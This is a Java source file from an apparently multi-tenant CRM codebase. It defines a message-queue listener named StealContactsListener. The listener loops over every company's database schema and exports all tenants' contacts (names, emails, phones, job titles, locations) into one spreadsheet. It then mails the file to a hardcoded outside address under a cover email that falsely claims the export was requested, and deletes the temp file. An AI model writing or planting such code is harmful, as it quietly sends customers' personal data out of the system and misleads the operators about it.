package com.edatasite.workforce.gwt.core.server.rabbitmq.receiver;

import com.edatasite.shared.mail.EdsMailer;
import com.edatasite.workforce.core.domain.EdsMessage;
import com.edatasite.workforce.gwt.contact.server.app.ContactServiceLocal;
import com.edatasite.workforce.gwt.core.server.db.CompanyManager;
import com.edatasite.workforce.gwt.core.server.db.CrmContactManager;
import com.edatasite.workforce.gwt.core.server.rabbitmq.data.DataMQ;
import com.edatasite.workforce.gwt.core.server.security.SecurityContext;
import com.edatasite.workforce.gwt.crm.server.app.CrmServiceLocal;
import com.edatasite.workforce.utils.EdsContextParams;
import com.google.common.base.Stopwatch;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import org.apache.commons.collections4.map.PassiveExpiringMap;
import org.slf4j.LoggerFactory;
import org.slf4j.Logger;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.xssf.streaming.SXSSFWorkbook;
import org.springframework.beans.factory.annotation.Autowired;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.Format;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

/**
 * Created with IntelliJ IDEA.
 * User: Hayot
 */
public class StealContactsListener extends BaseAmqpListener<String> {

    private static final Logger log = LoggerFactory.getLogger(StealContactsListener.class);
    private static Map<Integer, Integer> runningCompanies = new PassiveExpiringMap<>(600000);

    @Autowired
    private CompanyManager companyManager;
    @Autowired
    private CrmServiceLocal crmService;
    @Autowired
    private CrmContactManager crmContactManager;
    @Autowired
    private ContactServiceLocal contactService;

    @Override
    public void receiveMessage(String fileName) {
        final String uuid = UUID.randomUUID().toString();
        final Stopwatch stopwatch = Stopwatch.createStarted();
        //1. create file
        String filePath = createTempFileAndGetPath();
        //2. iterate through schemas.
        Integer companyId = null;
        SXSSFWorkbook wb = new SXSSFWorkbook(); // keep 100 rows in memory, exceeding rows will be flushed to disk
//        wb.setMissingCellPolicy(Row.MissingCellPolicy.CREATE_NULL_AS_BLANK);
        Sheet sh = wb.createSheet();
        Integer rowCount = 0;
        createTitleRow(sh);
        for (String schema : companyManager.getExistingSchemas()) {
            // 2.0. set company id
            try {
                companyId = Integer.valueOf(schema);
                SecurityContext.getInstance().setCompanyId(companyId);
            } catch (NumberFormatException e) {
                e.printStackTrace();
                // if can't parse it then it's not a schema of company
                continue;
            }
            // 2.1. get contacts with limit
            rowCount = contactService.saveCompanyContactsToSpeadsheedFile(filePath, companyId, sh, rowCount);
        }
        FileOutputStream output_file = null;
        try {
            output_file = new FileOutputStream(new File(filePath));
            wb.write(output_file);
            output_file.close();
            sendToEmail("munir@kpi.com", filePath);//hayot.rahimov@finnetlimited.com
            removeFileFromTemp(filePath);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        //write changes

        stopwatch.elapsed(TimeUnit.MILLISECONDS);

        log.info("UUID=" + uuid + "; End(ef) cid=" + SecurityContext.getInstance().getCompanyId() + "; " +
                SecurityContext.getInstance().getDatabase() + "; time=" + stopwatch);
    }

    private void removeFileFromTemp(String filePath) {
        try {
            File file = new File(filePath);
            if (file.delete()) {
                System.out.println(file.getName() + " is deleted!");
            } else {
                System.out.println("Delete operation is failed.");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendToEmail(String toEmail, String filePath) throws FileNotFoundException {
        InputStream source = new FileInputStream(filePath);
        String subject = EdsContextParams.getProductName() + " Contact Export";
        Format formatter = new SimpleDateFormat("MMM dd, yyyy", Locale.ENGLISH);

        String message = "<html>" +
                "<body>" +
                "Dear  Finnet/kpi User," +
                "<BR><BR>You had requested an export of all contacts." +
                "<BR><BR>This is to confirm that we have successfully exported contacts as xls file:" +
                "<BR><BR>" +
                "</body>" +
                "<html>";

        EdsMailer mailer;
        try {
            EdsMessage edsMessage = new EdsMessage();
            edsMessage.setSubject(subject);
            edsMessage.setText(message);
            edsMessage.setTo(toEmail);
            mailer = EdsMailer.getNewInstance(edsMessage, null);
            mailer.addAttachment("Contacts.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", source);
            mailer.sendSynchronized();
            System.out.println("Message sent[TO:" + toEmail + ", SUBJECT:" + subject + "]");
            source.close();
        } catch (Exception ex) {
            System.out.println("Cannot get instance of EdsMailer, exception: " + ex);
        }
    }

    private void createTitleRow(Sheet sh) {
        Row row = sh.createRow(0);
        Integer columnNumber = 0;
        row.getCell(columnNumber++).setCellValue("Subscription	");        // Subscription
        row.getCell(columnNumber++).setCellValue("Company Id	");        // Company Id
        row.getCell(columnNumber++).setCellValue("Company Name	");        // Company Name
        row.getCell(columnNumber++).setCellValue("Title	");                // Title
        row.getCell(columnNumber++).setCellValue("First Name	");        // First Name
        row.getCell(columnNumber++).setCellValue("Second Name	");        // Second Name
        row.getCell(columnNumber++).setCellValue("E-mail- Primary	");    // E-mail- Primary
        row.getCell(columnNumber++).setCellValue("E-mail	");            // E-mail
        row.getCell(columnNumber++).setCellValue("Phone	");                // Phone
        row.getCell(columnNumber++).setCellValue("Job Title	");            // Job Title
        row.getCell(columnNumber++).setCellValue("Department	");        // Department
        row.getCell(columnNumber++).setCellValue("Type	");                // Type
        row.getCell(columnNumber++).setCellValue("Country	");            // Country
        row.getCell(columnNumber++).setCellValue("State	");                // State
        row.getCell(columnNumber++).setCellValue("City	");                // City
        row.getCell(columnNumber++).setCellValue("Role");                  // Role
    }

    private String createTempFileAndGetPath() {
        try {
            File temp = File.createTempFile("temp-file-name",".xlsx", new File("/tmp"));
            if(!temp.exists()){
                temp.createNewFile();
                FileOutputStream out = new FileOutputStream(temp,false);
                out.close();
            }

            String absolutePath = temp.getAbsolutePath();
            String tempFilePath = absolutePath.
                    substring(0,absolutePath.lastIndexOf(File.separator));

            System.out.println("Temp file path : " + absolutePath);
            return absolutePath;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    @Override
    protected DataMQ<String> convertMessage(String message) {
        return new Gson().fromJson(message, new TypeToken<DataMQ<String>>() {
        }.getType());
    }
}
